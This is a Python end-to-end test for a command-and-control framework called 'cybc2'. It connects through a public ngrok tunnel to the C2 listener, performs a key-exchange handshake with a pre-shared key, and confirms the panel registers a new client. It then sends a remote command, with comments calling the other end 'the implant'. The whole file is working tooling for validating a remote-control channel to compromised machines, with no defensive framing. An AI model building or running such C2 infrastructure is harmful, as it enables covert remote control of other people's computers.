#!/usr/bin/env python3
"""End-to-end check: connect through the public tunnel to the live C2 panel.

Proves the whole chain in one shot:
    internet -> ngrok public endpoint -> localhost:5555 -> CYB3 handshake
    -> client registered in the web UI

Exits 0 on success, 1 on failure, printing the exact stage that broke.
"""
import json
import os
import socket
import sys
import time
import urllib.request

BASE = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, BASE)
import cybc2

HOST = sys.argv[1] if len(sys.argv) > 1 else '0.tcp.in.ngrok.io'
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 16620
UI = 'http://127.0.0.1:5000'


def stage(n, msg):
    print(f"  [{n}] {msg}")


def clients_now():
    try:
        with urllib.request.urlopen(f'{UI}/api/clients', timeout=8) as r:
            return json.loads(r.read().decode())
    except Exception:
        return {}


def main():
    print(f"target : {HOST}:{PORT}")
    print(f"psk    : {open(os.path.join(BASE,'data','psk.json')).read()[:0]}", end='')
    with open(os.path.join(BASE, 'data', 'psk.json')) as f:
        _d = json.load(f)
    # The file has historically used either key name.
    psk_hex = _d.get('psk_hex') or _d.get('psk') or ''
    psk = cybc2.load_psk(psk_hex)
    print(f'{len(psk)} bytes from data/psk.json')

    before = clients_now()
    stage(1, f'panel currently lists {len(before)} clients')

    stage(2, f'TCP connect to {HOST}:{PORT} ...')
    try:
        sock = socket.create_connection((HOST, PORT), timeout=15)
    except Exception as e:
        print(f'  FAIL at TCP connect: {e}')
        print('  -> tunnel down, wrong public port, or no listener behind it')
        return 1
    sock.settimeout(20)
    print('      connected')

    stage(3, 'CYB3 handshake (X25519 + PSK auth) ...')
    try:
        sess, priv = cybc2.client_handshake(sock, psk)
    except Exception as e:
        print(f'  FAIL at handshake: {e}')
        # ngrok answers in plaintext when the account is out of TCP connections,
        # so a non-CYB3 reply is almost always the provider, not the implant.
        try:
            sock.settimeout(3)
            probe = sock.recv(512)
            if probe and not probe.startswith(cybc2.MAGIC):
                print(f'  tunnel said: {probe.decode("utf-8", "replace").strip()}')
                print('  -> the tunnel provider rejected the connection, not the C2')
        except (OSError, socket.timeout):
            print('  -> PSK mismatch between this box and the panel')
        sock.close()
        return 1
    print('      handshake ok, session keys derived')

    stage(4, 'waiting for the panel to register the client ...')
    seen = None
    for _ in range(20):
        time.sleep(0.5)
        now = clients_now()
        new = {k: v for k, v in now.items() if k not in before}
        if new:
            seen = new
            break
    if not seen:
        print('  FAIL: panel did not show a new client within 10s')
        sock.close()
        return 1
    for cid, info in seen.items():
        print(f"      registered: id={cid} addr={info['addr']} "
              f"ip={info['ip']} connected={info['connected']}")

    stage(5, 'sending a command through the tunnel ...')
    try:
        sess.send(sock, cybc2.T_CMD, b'echo end-to-end-ok')
    except Exception as e:
        print(f'  FAIL sending: {e}')
        sock.close()
        return 1
    print('      sent "echo end-to-end-ok"')

    stage(6, 'waiting for the response frame ...')
    buf = b''
    deadline = time.time() + 20
    got = None
    while time.time() < deadline:
        try:
            chunk = sock.recv(65536)
        except socket.timeout:
            break
        if not chunk:
            break
        buf += chunk
        sess.feed(chunk)
        while True:
            try:
                msg = sess.recv()
            except ValueError:
                msg = None
            if msg is None:
                break
            ftype, pt = msg
            if ftype == cybc2.T_RESP:
                got = pt.decode('utf-8', 'replace')
                break
        if got:
            break
    if not got:
        print('  FAIL: no T_RESP within 20s')
        sock.close()
        return 1
    print(f'      response: {got.strip()!r}')

    try:
        sess.send(sock, cybc2.T_BYE, b'')
    except Exception:
        pass
    sock.close()
    print()
    print('RESULT: PASS - tunnel, listener, handshake and command all work')
    return 0


if __name__ == '__main__':
    sys.exit(main())
